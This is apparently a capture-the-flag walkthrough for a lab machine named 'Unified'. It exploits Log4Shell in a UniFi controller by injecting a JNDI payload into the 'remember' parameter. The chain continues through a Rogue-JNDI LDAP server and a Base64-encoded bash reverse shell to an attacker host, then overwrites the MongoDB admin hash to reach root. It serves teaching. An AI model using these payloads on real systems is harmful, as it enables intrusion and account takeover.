# Unified

This machine introduces the Log4Shell (Log4j) vulnerability, LDAP-based remote code execution, MongoDB enumeration, and privilege escalation through credential recovery.

## Find open ports and services running on the target IP

Perform a service scan to identify open ports and running services.

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

Expected result:

* Port 22: SSH
* Port 6789: UniFi Discovery Service
* Port 8080: HTTP
* Port 8443: UniFi Network Interface

The presence of a UniFi Network Controller on port 8443 is particularly interesting because older versions are known to be vulnerable to Log4Shell.

## Identify the Log4Shell vulnerability

Browse to:

```text
https://<target_ip>:8443
```

Since the application uses HTTPS, ensure you use the `https://` scheme.

Start Burp Suite and intercept a login request.

Send the request to Repeater for testing.

Inspect the request parameters and identify the `remember` parameter.

### Test for Log4Shell

Insert the following payload into the `remember` parameter:

```text
${jndi:ldap://<attacker_vpn_ip>/test}
```

The payload attempts to force the application to perform a JNDI lookup against an LDAP server controlled by the attacker.

If the application is vulnerable, Log4j will process the expression and attempt to contact the attacker-controlled LDAP server.

An error response is usually sufficient to indicate that the lookup was processed.

Reference:

* CVE-2021-44228 (Log4Shell)

## Setup Rogue-JNDI

### Clone the repository

Command:

```bash
git clone https://github.com/veracode-research/rogue-jndi

cd rogue-jndi
```

### Build the project

Command:

```bash
mvn package
```

This generates the RogueJNDI JAR file which can serve malicious LDAP responses.

## Prepare the reverse shell payload

Many Linux systems may not have Netcat installed. A Bash reverse shell is therefore a more reliable option.

Generate a Base64 encoded payload:

```bash
echo "bash -c 'bash -i >& /dev/tcp/<attacker_vpn_ip>/<port> 0>&1'" | base64
```

A Base64 string will be produced.

Base64 encoding helps avoid shell parsing issues and allows complex commands to be transported safely through multiple layers before being decoded and executed.

## Start the malicious LDAP server

Command:

```bash
java -jar /path/to/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_STRING}|{base64,-d}|{bash,-i}" --hostname "<attacker_vpn_ip>"
```

Explanation:

* `java -jar /path/to/RogueJndi-1.1.jar`

  * Starts the RogueJNDI LDAP server.

* `--command`

  * Specifies the command that should execute on the target once the Log4Shell vulnerability is triggered.

* `{echo,BASE64_STRING}|{base64,-d}|{bash,-i}`

  * Echoes the Base64 payload.
  * Decodes it.
  * Pipes the result into Bash for execution.

* `--hostname`

  * Specifies the attacker's IP address that will host the LDAP service.

The LDAP server will display a URL similar to:

```text
ldap://<attacker_vpn_ip>:1389/o=tomcat
```

Keep this URL for the next step.

## Catch the reverse shell

Start a listener on the same port used in the reverse shell payload.

Command:

```bash
nc -nvlp <port>
```

Replace the previous test payload with:

```text
${jndi:ldap://<attacker_vpn_ip>:1389/o=tomcat}
```

Send the request.

The UniFi application contacts the LDAP server, retrieves the malicious object, and executes the supplied command.

A reverse shell should be received on the listener.

## Upgrade the shell

Spawn a more usable shell.

Command:

```bash
script /dev/null -c bash
```

## Retrieve the user flag

Navigate to Michael's home directory.

Command:

```bash
cd /home/michael

ls

cat user.txt
```

The user flag is obtained.

## Enumerate MongoDB

The machine information suggests that MongoDB is being used internally.

Check running processes:

```bash
ps aux | grep mongo
```

MongoDB is found listening on port:

```text
27117
```

## Enumerate administrator accounts

Query the database:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Explanation:

* `mongo`

  * MongoDB command-line client.

* `--port 27117`

  * Connects to the internal MongoDB instance.

* `ace`

  * The database being accessed.

* `db.admin.find()`

  * Retrieves all administrator records.

* `.forEach(printjson)`

  * Prints each result in JSON format for easier reading.

Locate the `administrator` account.

Notice the `x_shadow` field, which stores a SHA-512 password hash.

Since cracking the hash is impractical, replacing it is a more effective approach.

## Generate a new password hash

On the attacker machine:

```bash
mkpasswd -m sha-512 Password123!
```

Explanation:

* `mkpasswd`

  * Generates password hashes.

* `-m sha-512`

  * Uses the SHA-512 hashing algorithm.

The generated hash will be used to replace the administrator's existing password hash.

## Replace the administrator password

Execute:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("ADMIN_OBJECT_ID")},{$set:{"x_shadow":"<generated_hash>"}})'
```

Explanation:

* `db.admin.update()`

  * Updates an existing document.

* `ObjectId("ADMIN_OBJECT_ID")`

  * Targets the administrator account.

* `$set`

  * Modifies specific fields without replacing the entire document.

* `x_shadow`

  * Stores the password hash used by UniFi authentication.

After execution, the administrator password becomes:

```text
Password123!
```

## Login to UniFi as administrator

Authenticate using:

```text
administrator:Password123!
```

Navigate to:

```text
Settings → Site
```

Near the bottom of the page, the root credentials can be revealed.

Example:

```text
root:NotACrackablePassword4U2022
```

## Gain root access

SSH into the target.

Command:

```bash
ssh root@<target_ip>
```

Enter the recovered password.

## Retrieve the root flag

Navigate to the root directory:

```bash
cd /root

ls

cat root.txt
```

The root flag is successfully obtained.

## Key Takeaways

1. Log4Shell allows remote code execution through malicious JNDI lookups.
2. LDAP can be abused to deliver attacker-controlled payloads.
3. Base64 encoding is commonly used to safely transport complex shell commands.
4. Internal services such as MongoDB should always be enumerated after gaining a foothold.
5. Modifying stored password hashes can be easier than cracking them.
6. Administrative web interfaces often expose additional credentials useful for privilege escalation.
